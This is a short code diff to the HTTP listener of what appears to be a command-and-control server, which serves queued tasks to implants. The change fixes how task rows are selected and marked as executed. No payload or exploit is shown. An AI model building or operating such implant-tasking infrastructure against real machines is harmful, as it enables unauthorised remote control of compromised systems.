@@ -44,7 +44,7 @@ class HTTPListener:
         try:
             self.update_last_seen(agent_id)
             self.cur.execute("""
-                SELECT it.task_id, t.content 
+                SELECT it.id, t.content 
                 FROM implant_task it
                 JOIN tasks t ON it.task_id = t.id
                 WHERE it.executed = 0
@@ -60,8 +60,8 @@ class HTTPListener:
             task_id, content = task
             self.update_history(agent_id, "get_task", content)
             self.cur.execute(
-                "UPDATE implant_task SET executed = 1, date = ? WHERE task_id = ? AND implant_id = ?",
-                (datetime.datetime.now(), task_id, agent_id)
+                "UPDATE implant_task SET executed = 1 WHERE id = ? AND implant_id = ?",
+                (task_id, agent_id)
             )
             self.con.commit()
             return jsonify({"task": content}), 200
